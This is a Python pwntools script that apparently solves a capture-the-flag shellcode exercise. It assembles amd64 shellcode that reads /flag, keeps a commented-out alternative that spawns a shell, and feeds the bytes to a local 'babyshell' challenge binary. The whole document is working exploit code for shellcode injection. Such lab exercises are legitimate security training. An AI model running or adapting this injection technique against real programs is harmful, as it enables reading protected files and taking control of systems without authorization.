import pwn
from pwn import *
import os 
pwnlib.context.context.log_level="DEBUG"
pwnlib.context.context.os = 'linux'
pwnlib.context.context.arch = 'amd64'

def get_value(var_name, proc):
    proc.recvuntil("{} = ".format(var_name))
    val = proc.recvuntil("\n").decode("utf-8")
    val.replace(" ", "")
    return val

filename = "/flag"

chall_id = int(os.environ["CHALLENGE_ID"])-216

#code_asm = pwnlib.shellcraft.amd64.linux.sh()
code_asm = pwnlib.shellcraft.amd64.linux.cat(filename, fd=1)
code_bytes = asm(code_asm)

chall = pwn.process(f"/challenge/babyshell_level{chall_id}")
chall.recvuntil(b'Reading 0x1000 bytes from stdin.\n')
chall.recvline() # newline
chall.send_raw(code_bytes)
chall.recvall()
